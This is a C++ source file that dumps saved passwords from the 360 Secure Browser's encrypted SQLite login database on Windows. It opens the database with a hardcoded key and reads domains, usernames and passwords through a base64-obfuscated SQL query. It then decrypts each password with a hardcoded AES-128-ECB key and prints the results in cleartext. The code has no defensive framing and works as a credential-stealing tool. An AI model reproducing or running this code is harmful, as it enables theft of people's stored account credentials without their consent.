#define _CRT_SECURE_NO_WARNINGS
#ifndef AAA_SOURCE
#define AAA_SOURCE
#endif

#ifndef SQLITE_HAS_CODEC
#define SQLITE_HAS_CODEC
#endif
#include "sqlite3.h"
#include<Windows.h>
#include<iostream>
#include<vector>
#include<string>
#include<openssl\evp.h>
#include<openssl\ssl.h>
#include<openssl\aes.h>
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "libsqlite3.lib")
/*
static const char* szSqlite_path = "C:\\Users\\dell\\AppData\\Roaming\\secoresdk\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db";
static const char* szKey = "5cbfe6e6-21aa-40df-8b1e-895f086fc497";
*/

using namespace std;

static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char aes_key[] = { 0x63, 0x66, 0x36, 0x36, 0x66, 0x62, 0x35, 0x38, 0x66, 0x35, 0x63, 0x61, 0x33, 0x34, 0x38, 0x35 };

std::string aes_128_ecb_decrypt(const std::string& ciphertext, const char* key)
{
	EVP_CIPHER_CTX *ctx;
	ctx = EVP_CIPHER_CTX_new();
	int ret = EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, (const unsigned char*)key, NULL);
	unsigned char* result = new unsigned char[ciphertext.length() + 64]; // 弄个足够大的空间
	EVP_CIPHER_CTX_set_padding(ctx, 0);	//EVP_CIPHER_CTX_set_padding函数强制设置ctx为NO_PADDING
	int len1 = 0;
	ret = EVP_DecryptUpdate(ctx, result, &len1, (const unsigned char*)ciphertext.data(), ciphertext.length());
	int len2 = 0;
	ret = EVP_DecryptFinal_ex(ctx, result + len1, &len2);
	ret = EVP_CIPHER_CTX_cleanup(ctx);
	EVP_CIPHER_CTX_free(ctx);
	std::string res((char*)result, len1 + len2);
	delete[] result;
	return res;
}

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

string base64_decode(std::string const& encoded_string, std::string base64_chars) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i <4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j <4; j++)
			char_array_4[j] = 0;

		for (j = 0; j <4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}


class sqlresult{
public:
	sqlresult()
	{

	}

	sqlresult(string domain, string account, string encode_password)
	{
		this->m_domain = domain;
		this->m_account = account;
		this->m_encode_password = encode_password;
	}
	
	~sqlresult()
	{
		
	}

public:
	string m_domain;
	string m_account;
	string m_encode_password;
	string m_decode_password;
};

vector<sqlresult> g_v_sqlresult;


// 回调函数
int _callback(void* data, int argc, char** argv, char** szColName){
	g_v_sqlresult.push_back(sqlresult(argv[0], argv[1], argv[2]));
	return 0;
}

class SqliteDecrypt{
public:

	SqliteDecrypt()
	{
	
	}

	SqliteDecrypt(string szSqlite_path, string szKey){
		this->m_szdb_path = szSqlite_path;
		this->m_szpass_key = szKey;
	}

	~SqliteDecrypt()
	{
		sqlite3_close(this->sqlite3_obj);
	}

private:
	int _m_init_database(){
		if (!(sqlite3_open(this->m_szdb_path.c_str(), &sqlite3_obj) == SQLITE_OK)){
			cout << "sqlite3_open failed!" << endl;
			return -1;
		}

		if (!(sqlite3_key(this->sqlite3_obj, this->m_szpass_key.c_str(), this->m_szpass_key.size()) == SQLITE_OK))
		{
			cout << "sqlite3_key failed!" << endl;
			sqlite3_close(this->sqlite3_obj);
			return -1;
		}
		
		return 0;
	}
	
	int _m_select_tbaccount(){

		
		if (!(sqlite3_exec(sqlite3_obj, base64_decode("c2VsZWN0IGRvbWFpbiwgdXNlcm5hbWUsIHBhc3N3b3JkIGZyb20gdGJfYWNjb3VudDs=", base64_chars).c_str(), _callback, NULL, NULL) == SQLITE_OK)){
			return -1;
		}

		// select domain, username, password from tb_account;
		/*
		if (!(sqlite3_exec(sqlite3_obj, (const char*)"select domain, username, password from tb_account;", _callback, NULL, NULL) == SQLITE_OK)){
			return -1;
		}*/

		// cout << "select * from tb_account" << endl;

		//遍历进行解密操作
		for (int i=0; i < g_v_sqlresult.size(); i++){
			// cout << g_v_sqlresult[i].m_encode_password << endl;
			// cout << _m_decode_func(g_v_sqlresult[i].m_encode_password.substr(14)).c_str() << endl;
			char* szbuffer = new char[MAX_PATH];
			memset(szbuffer, 0, MAX_PATH);
			strcpy(szbuffer,_m_decode_func(g_v_sqlresult[i].m_encode_password.substr(14)).c_str());
			//cout << szbuffer << endl;
			string tempstr;
			if (*szbuffer == '\x01'){
				for (int j = 0; j<strlen(szbuffer); j += 2){
					//cout << j << endl;
					tempstr.append(1, szbuffer[j]);
				}
			}

			if(*szbuffer == '\x02'){
				for (int j = 1; j<0x32; j += 2){
					//cout << j << endl;
					tempstr.append(1, szbuffer[j]);
				}
			}

			g_v_sqlresult[i].m_decode_password = tempstr;
			delete szbuffer;
		}
		
		return 0;
	}

	int _m_show_decrypt_records(){
		for (int i=0; i < g_v_sqlresult.size(); i++){
			cout << "[*] " << "domain: " << g_v_sqlresult[i].m_domain << " " << "account: " << g_v_sqlresult[i].m_account << " " << "password: " << g_v_sqlresult[i].m_decode_password << endl;
 		}
		return 0;
	}

	string _m_decode_func(string encode_password){
		// aes128 ecb解码
		// base64 解码
		string wow_decode_password = aes_128_ecb_decrypt(base64_decode(encode_password, base64_chars), aes_key);
		//cout << wow_decode_password << endl;
		return wow_decode_password;
	}

public:
	void m_getpass(){
		this->_m_init_database();
		this->_m_select_tbaccount();
		this->_m_show_decrypt_records();
	}

private:
	string m_szdb_path;
	string m_szpass_key;
	string m_machine_guid;
	sqlite3* sqlite3_obj = NULL;
	int sqlresult_size = 0;
};

// machine_guid还没写
string _get_machine_guid(){
	string machineguid;
	//RegOpenKeyEx();
	//RegQueryValueEx();
	return machineguid;
}

int main(int argc, char* argv[]){

	/*
	static const char* szSqlite_path = "C:\\Users\\dell\\AppData\\Roaming\\secoresdk\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db";
	static const char* szKey = "5cbfe6e6-21aa-40df-8b1e-895f086fc497";
	*/
	if (argc == 2)
	{
		SqliteDecrypt(argv[0], argv[1]).m_getpass();
	}
	else{
		SqliteDecrypt("C:\\Users\\dell\\AppData\\Roaming\\secoresdk\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db", "5cbfe6e6-21aa-40df-8b1e-895f086fc497").m_getpass();
	}

	/*
	std::string decrypt = aes_128_ecb_decrypt(base64_decode("S5/J5teUYGTpWLxtIVB6EM7xAv1HKq9utI90kdMhCmE=", base64_chars), aes_key);
	std::cout << "AES解密:" + decrypt << std::endl;*/
	return 0;
}